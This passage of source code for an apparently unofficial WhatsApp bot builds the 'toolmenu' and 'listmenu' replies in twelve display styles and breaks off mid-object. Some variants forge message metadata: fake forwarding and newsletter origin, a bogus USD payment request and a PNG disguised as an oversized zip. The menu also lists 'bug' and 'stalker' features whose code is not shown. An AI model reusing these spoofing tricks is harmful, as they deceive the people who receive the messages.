        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'toolmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Tool Menu* 」❍
│${setv} ${prefix}*obfuscate√*
│${setv} ${prefix}*styletext√*
│${setv} ${prefix}*fliptext√*
│${setv} ${prefix}*tts√*
│${setv} ${prefix}*say√*
│${setv} ${prefix}*togif√*
│${setv} ${prefix}*toqr√*
│${setv} ${prefix}*bass√*
│${setv} ${prefix}*blown√*
│${setv} ${prefix}*deep√*
│${setv} ${prefix}*earrape√*
│${setv} ${prefix}*fast√*
│${setv} ${prefix}*fat√*
│${setv} ${prefix}*nightcore√*
│${setv} ${prefix}*reverse√*
│${setv} ${prefix}*robot√*
│${setv} ${prefix}*slow√*
│${setv} ${prefix}*smooth√*
│${setv} ${prefix}*squirrel√*
│${setv} ${prefix}*tinyurl√*
│${setv} ${prefix}*tovn√*
│${setv} ${prefix}*toptv√*
│${setv} ${prefix}*toaudio√*
│${setv} ${prefix}*tomp3√*
│${setv} ${prefix}*tomp4√*
│${setv} ${prefix}*toimg√*
│${setv} ${prefix}*toonce√*
│${setv} ${prefix}*toptv√*
│${setv} ${prefix}*sticker√*
│${setv} ${prefix}*smeme√
│${setv} ${prefix}*smeta√*
│${setv} ${prefix}*take™*
│${setv} ${prefix}*emojimix√*
│${setv} ${prefix}*volaudio√*
│${setv} ${prefix}*volvideo√*
│${setv} ${prefix}*ebinary√*
│${setv} ${prefix}*dbinary√*
│${setv} ${prefix}*ssweb√*
│${setv} ${prefix}*quoted√*
│${setv} ${prefix}*translate√*
│${setv} ${prefix}*get√*
│${setv} ${prefix}*url√*
│${setv} ${prefix}*write√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/LFUeW9Z.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/LFUeW9Z.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'listmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *List Menu* 」❍
│${setv} ${prefix}*listprem√*
│${setv} ${prefix}*listowner√*
│${setv} ${prefix}*liststicker√*
│${setv} ${prefix}*listimage√*
│${setv} ${prefix}*listvideo√*
│${setv} ${prefix}*listvn√*
│${setv} ${prefix}*listapk√*
│${setv} ${prefix}*listzip√*
│${setv} ${prefix}*listpdf√*
│${setv} ${prefix}*listbadword√*
│${setv} ${prefix}*listpc√*
│${setv} ${prefix}*listgc√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/LFUeW9Z.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/LFUeW9Z.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
